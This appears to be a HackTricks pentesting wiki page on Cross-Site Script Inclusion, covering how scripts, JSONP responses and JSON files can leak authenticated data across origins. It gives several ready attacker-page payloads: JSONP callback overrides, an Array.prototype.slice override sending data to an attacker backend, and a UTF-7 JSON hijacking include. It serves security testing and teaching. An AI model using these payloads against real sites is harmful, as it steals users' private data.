# XSSI (Cross-Site Script Inclusion)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

#### The information was taken from [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)

## Basic Information

XSSI designates a kind of vulnerability which exploits the fact that, when a **resource is included using the `script` tag, the SOP doesn’t apply**, because scripts have to be able to be included cross-domain. An attacker can thus **read everything** that was included using the **`script` tag**.

This is especially interesting when it comes to dynamic JavaScript or JSONP when so-called ambient-authority information like cookies are used for authentication. The cookies are included when requesting a resource from a different host.

### Types

1. Static JavaScript (regular XSSI)
2. Static JavaScript, which is only accessible when authenticated
3. Dynamic JavaScript
4. Non-JavaScript

## Regular XSSI

The private information is located inside a global accessible JS file, you can just detect this by reading files, searching keywords or using regexps.\
To exploit this, just include the script with private information inside the malicious content:

```markup
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```

## Dynamic-JavaScript-based-XSSI and Authenticated-JavaScript-XSSI

**Confidential information is added to the script when a user requests it**. This can be easily discovered by sending the request **with and without the cookies**, if **different information** is retrieved, then confidential information could be contained. To do this automatically you can use burp extension: [https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

If the information resides inside a global variable, you you can exploit it using the same code as for the the previous case.\
If the confidential data is sent inside a JSONP response, you can override the executed function to retrieve the information:

```markup
<script>
      //The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({"status":STATUS,"body":{"demographics":{"email":......}}})
      var angular = function () { return 1; };
      angular.callbacks = function () { return 1; };      
      angular.callbacks._7 = function (leaked) {
	  alert(JSON.stringify(leaked));
      };  
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

Or you could also set a prepared function to be executed by the JSONP response:

```markup
<script>
      leak = function (leaked) {
	  alert(JSON.stringify(leaked));
      };  
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```

If a variable does not reside inside the global namespace, sometimes this can be exploited anyway using _prototype tampering_. Prototype tampering abuses the design of JavaScript, namely that when interpreting code, JavaScript traverses the prototype chain to find the called property. The following example is extracted from the paper [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) and demonstrates how overriding a relevant function of type `Array` and access to `this`, a non-global variable can be leaked as well.

```javascript
(function(){
  var arr = ["secret1", "secret2", "secret3"];
  // intents to slice out first entry
  var x = arr.slice(1);
  ...
})();
```

In the original code `slice` from type `Array` accesses the data we’re interested in. An attacker can, as described in the preceding clause, override `slice` and steal the secrets.

```javascript
Array.prototype.slice = function(){
  // leaks ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this);
};
```

Security Researcher [Sebastian Lekies](https://twitter.com/slekies) just recently updated his list of [vectors](http://sebastian-lekies.de/leak/).

## Non-Script-XSSI

Takeshi Terada describes another kind of XSSI in his paper [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf). He was able to leak Non-Script files cross-origin by including, among others, CSV files as source in the `script` tag, using the data as variable and function names.

The first publicly documented XSSI attack was in 2006. Jeremiah Grossman’s blog entry [Advanced Web Attack Techniques using GMail](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html) depicts a XSSI, which by overriding the `Array` constructor was able to read the complete address book of a google account.

In 2007 Joe Walker published [JSON is not as safe as people think it is](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/). He uses the same idea to steal JSON that is inside an `Array`.

Other related attacks were conducted by injecting UTF-7 encoded content into the JSON to escape the JSON format. It is described by Gareth Heyes, author of [Hackvertor](https://hackvertor.co.uk/public), in the blog entry [JSON Hijacking](http://www.thespanner.co.uk/2011/05/30/json-hijacking/) released in 2011. In a quick test, this was still possible in Microsoft Internet Explorer and Edge, but not in Mozilla Firefox or Google Chrome.

JSON with UTF-7:

```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

Including the JSON in the attacker’s page

```markup
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
